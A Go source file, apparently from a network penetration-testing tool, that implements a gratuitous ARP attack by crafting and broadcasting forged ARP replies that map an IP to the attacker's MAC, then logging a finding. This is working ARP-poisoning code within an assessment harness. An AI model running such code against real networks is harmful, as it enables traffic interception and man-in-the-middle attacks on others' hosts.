// gratarp.go implements the gratuitous ARP attack behavior. It sends
// broadcast ARP replies announcing an IP→MAC mapping. Classified
// transient-decay: the neighbor cache ages out after the attack stops.

package fh

import (
	"context"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
)

type gratARPFinding struct {
	Action string `json:"action"`
	IP     string `json:"ip"`
	Count  int    `json:"count"`
}

// RunGratARP sends gratuitous ARP replies announcing the attacker's MAC
// for a given IP. The in-memory test shape sends a bounded burst.
func RunGratARP(ctx context.Context, deps runner.Deps) error {
	src := srcMAC()
	ip := net.IPv4(10, 0, 0, 1)

	count := 3
	for i := range count {
		pkt, err := craftGratARP(src, ip)
		if err != nil {
			return fmt.Errorf("gratarp: craft frame %d: %w", i, err)
		}
		if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
			return fmt.Errorf("gratarp: send frame %d: %w", i, err)
		}
	}

	detail, _ := json.Marshal(gratARPFinding{
		Action: "gratuitous-arp",
		IP:     ip.String(),
		Count:  count,
	})
	deps.Emitter.Finding("arp", detail)

	return nil
}

// craftGratARP builds a gratuitous ARP reply: announcing ip is-at src.
func craftGratARP(src net.HardwareAddr, ip net.IP) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       broadcastMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := &layers.ARP{
		AddrType:          1,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         2, // reply
		SourceHwAddress:   src,
		SourceProtAddress: ip,
		DstHwAddress:      broadcastMAC,
		DstProtAddress:    ip,
	}
	return craft.Default(eth, arp)
}
